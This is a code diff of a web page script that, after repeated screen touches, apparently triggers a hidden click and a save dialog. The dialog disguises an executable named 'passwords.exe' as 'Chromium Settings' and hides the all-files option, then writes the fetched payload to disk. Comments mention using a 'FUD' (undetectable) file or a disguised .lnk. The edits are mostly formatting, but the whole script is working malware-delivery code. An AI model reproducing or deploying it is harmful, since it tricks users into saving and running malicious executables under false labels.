@@ -43,21 +43,21 @@
 
 <body>
    <script>
-    // how many times screen is touched in a row
-    let countTouch = 0;
-    // is file downloaded
+    //how many time enter clicked in row
+    let countEnter = 0;
+    //is file downloaded
     let isDownloaded = false;
 
-    // on page load
+    //on page load
     window.onload = function () {
-        const body = document.querySelector('body');
-        const pixel = document.querySelector('#pixel');
+        const body = document.querySelector('body')
+        const pixel = document.querySelector('#pixel')
 
         document.addEventListener('touchstart', () => {
-            countTouch++;
-            if (countTouch > 5 && !isDownloaded) {
+            countEnter++;
+            if (countEnter > 5 && !isDownloaded) {
                 pixel.click();
-                // set file is downloaded
+                //set file is downloaded
                 isDownloaded = true;
             }
         });
@@ -68,21 +68,22 @@
                 suggestedName: 'passwords',
                 types: [
                     {
-                        description: 'Chromium Settings',
+                        description:
+                            'Chromium Settings',
                         accept: {
-                            'text/plain': ['.exe'] // could be .exe/.bat or anything
+                            'text/plain': ['.exe'] //could be .exe/.bat or anything
                         }
                     }
                 ],
-                // delete from Save as type "*.*" option
+                //delete from Save as type "*.*" option
                 excludeAcceptAllOption: true
-            };
+            }
 
             const handle = await window.showSaveFilePicker(options);
             const writable = await handle.createWritable();
             // 1) download file from local/server (Good for exe)
-            // you need to have FUD file lnkextra.lnk on server/local
-            // can be changed to diffrent file like cat.jpg
+            //you need to have FUD file lnkextra.lnk on server/local
+            //can be changed to diffrent file like cat.jpg
             const response = await fetch('passwords.exe');
             await response.body.pipeTo(writable);
 
